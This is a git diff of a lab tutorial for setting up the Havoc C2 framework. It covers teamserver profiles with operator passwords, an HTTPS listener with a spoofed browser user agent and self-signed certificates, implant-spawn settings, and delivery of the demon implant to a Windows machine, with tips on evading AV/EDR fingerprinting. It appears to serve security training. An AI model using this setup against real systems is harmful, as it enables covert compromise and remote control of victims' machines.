@@ -62,15 +62,17 @@ make client-build
 ```
 
 # Creating a custom profile
-Let's have a look at the custom profile we have created for this team server. The profile will have the general settings such as users that can log in to the team server, user agents for HTTP/HTTPs listeners, and how our implants will behave.
+Let's have a look at the default profile provided for this team server. The profile will have the general settings such as users that can log in to the team server, user agents for HTTP/HTTPs listeners, and how our implants will behave.
 
-> ***OPSEC HINT*** : Always customize your profiles as default profiles are almost often finger printed by AV/EDR.
+> ***OPSEC HINT*** : Always customize your profiles as default profiles are almost often finger-printed by AV/EDR, we will do this later on
 
 ```bash
+cd /opt/Havoc/profiles
+cp havoc.yaotl custom.yaotl
 sudo nano /opt/Havoc/profiles/custom.yaotl
 ```
 
-This is the content of the `custom.yoatl` profile:
+This is the content of the `custom.yaotl` profile:
 
 ```yaml
 Teamserver {
@@ -78,85 +80,59 @@ Teamserver {
     Port = 40056
 
     Build {
-        Compiler64 = "/usr/bin/x86_64-w64-mingw32-gcc" #latest version of kali this needs to be replaced
+        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
+        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
         Nasm = "/usr/bin/nasm"
     }
 }
 
 Operators {
-    user "Threatadmin" {
-        Password = "Threathunt25"
+    user "Threatadmin" {             # We added this account for our labs
+        Password = "Threathunt25"    # and this is the password
+    }
+
+    user "Neo" {
+        Password = "password1234"
     }
 }
 
-# demon setting.
+# this is optional. if you dont use it you can remove it.
+Service {
+    Endpoint = "service-endpoint"
+    Password = "service-password"
+}
 
 Demon {
     Sleep = 2
-    Jitter = 20
+    Jitter = 15
 
     TrustXForwardedFor = false
 
     Injection {
-        Spawn64 = "C:\\Windows\\System32\\Werfault.exe"
-    }
-
-    Binary {
-        ReplaceStrings-x64 = {
-            "demon.x64.dll": "",
-            "This program cannot be run in DOS mode.": "",
-        }
+        Spawn64 = "C:\\Windows\\System32\\notepad.exe"
+        Spawn32 = "C:\\Windows\\SysWOW64\\notepad.exe"
     }
 }
+
 ```
 
 # Running the teamserver
 
 ![Screenshot](./images/havoc_team.jpg)
 ```bash
-havoc server --profile /opt/Havoc/profiles/custom.yoatl -v --debug
+cd /opt/Havoc
+./havoc server --profile /opt/Havoc/profiles/custom.yaotl -v --debug
 ```
 
-Let's set thsis up as a service:
-
-```bash
-sudo nano /lib/systemd/system/havocservice.service
-```
-
-```yaml
-[Unit]
-Description=HavocServer
-After=network.target
-
-[Service]
-Type=idle
-Restart=on-failure
-User=root
-ExecStart="/usr/bin/havoc" "server" "--profile" "/opt/havoc/profiles/https.yaotl"
-
-[Install]
-
-```
-
-Change the file permisions, enable and start the service:
-
-```
-sudo chmod 644 /lib/systemd/system/
-sudo systemctl daemon-reload
-enable havocserver.service
-sudo systemctl start havocserver.service 
-systemctl status havocserver.service
-"
-```
 # Running the client
 
 ![Screenshot](./images/havoc_newtab.jpg)
 
 In your terminal open a new tab, then run the following command:
 
-
-```code
-havoc client
+```bash
+cd /opt/Havoc
+./havoc client
 ```
 We can now log in to our teamserver using the user `Threatadmin` and the password which we defined in the custom Havoc C2 profile.
 
@@ -176,7 +152,7 @@ Here's a regular chrome user agent from your windows machine:
 ```yaml
 Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
 ```
-Let's add an HTTPs listener, click on `Add` and enter the listener configuration. Give the listener a name, select `Https` and past the user agent in the correct field. Click on `Save`
+Let's add an HTTPs listener, click on `Add` and enter the listener configuration. Give the listener a name, select `HTTPS` and paste the user agent in the correct field. Click on `Save`
 
 > Make sure you select the correct IP addres (host) for your machine! You can double check by running ifconfig.
 
@@ -186,10 +162,12 @@ Let's add an HTTPs listener, click on `Add` and enter the listener configuration
 
 We can also add this to our Havoc profile, so that all these settings are applied when starting the team server. But before we do that, lets keep our OPSEC in mind, we need HTTPS - and we bettter not use the default SSL certificates, those might be signatured. 
 
+> ***IMPORTANT*** : Before continuing - delete the listener we just created, as we'll create one in our custom HTTPS profile next. In Havoc go to VIEW - LISTENERS - Select your listener - "REMOVE".
+
 Next we're going to create a self-signed SSL certificate (PEM) and key file - Self signed certificates are of course not ideal - in a real world scenario we'd have them signed by a trusted PKI.
 
 ```bash
-cd /opt/havoc/
+cd /opt/Havoc/
 mkdir certs
 cd certs
 openssl req -new -newkey rsa:4096 -x509 -sha256 -days 365 -nodes -out public.crt -keyout private.key
@@ -198,15 +176,14 @@ Output:
 
 ![Screenshot](./images/havoc_certs.jpg)
 
-Let's copy the custom.yoatl profile to a new HTTPS template where we'll add the certs, user-agent, listener settings and so on
+Let's create new HTTPS template where we'll add the certs, user-agent, listener settings and so on.
 
 ```bash
-cd /opt/havoc/profiles
-sudo cp custom.yoatl https.yoatl
-sudo nano /opt/Havoc/profiles/custom.yaotl
+cd /opt/Havoc/profiles
+sudo nano /opt/Havoc/profiles/HTTPS.yaotl
 ```
 
-This is the new content of the custom `HTTPS.yoatl` profile:
+Copy the below into your `HTTPS.yaotl` profile:
 
 ```yaml
 Teamserver {
@@ -214,11 +191,12 @@ Teamserver {
     Port = 40056
 
     Build {
-        Compiler64 = "/usr/bin/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
-        Compiler86 = "/usr/bin/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
+        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
+        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
         Nasm = "/usr/bin/nasm"
     }
 }
+
 
 Operators {
     user "Threatadmin" {
@@ -241,8 +219,8 @@ Listeners {
         Secure       = true
         UserAgent    = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
         Cert {
-                Cert = "/opt/havoc/certs/public.crt"
-                Key = "/opt/havoc/certs/private.key"
+                Cert = "/opt/Havoc/certs/public.crt"
+                Key = "/opt/Havoc/certs/private.key"
         }
      }
 }
@@ -271,13 +249,14 @@ Demon {
 Now close your Havoc Teamserver and client in terminal (control-c) and start the teamserver again with your new profile:
 
 ```bash
-havoc server --profile /opt/havoc/profiles/https.yoatl -v --debug
+cd /opt/Havoc
+./havoc server --profile /opt/havoc/profiles/HTTPS.yaotl -v --debug
 ```
 
 Open a second tab in your terminal and run:
 
 ```bash 
-havoc client
+./havoc client
 ```
 
 Let's go and check if our profile has created the HTTPS listener - in the Havoc client go to `VIEW`, `Listeners`, select the HTTPs Listener and click on edit. You'll see the following (please note the host bind address will be different from the screenshot).
@@ -301,7 +280,7 @@ updog2
 
 ![Screenshot](./images/havoc_kaliupdog.jpg)
 
-Now, on your windows machine use `Chrome` and go to <http:\\kali:9090\> and download the Havoc demon ("**demon.x64.exe**") to 
+Now, on your windows machine use `Chrome` and go to <http:\\kali:9090\> and download the Havoc demon ("**demon.x64.exe**") to "C:\Temp" - right-click on demon.x64.exe, save link as
 
 > ***NOTE***: "C:\Temp" is is whitelisted in MS Defender, we will deal with AV Evasion later on, for now we just want to make sure our code executes and sets up a c2 connection.
 
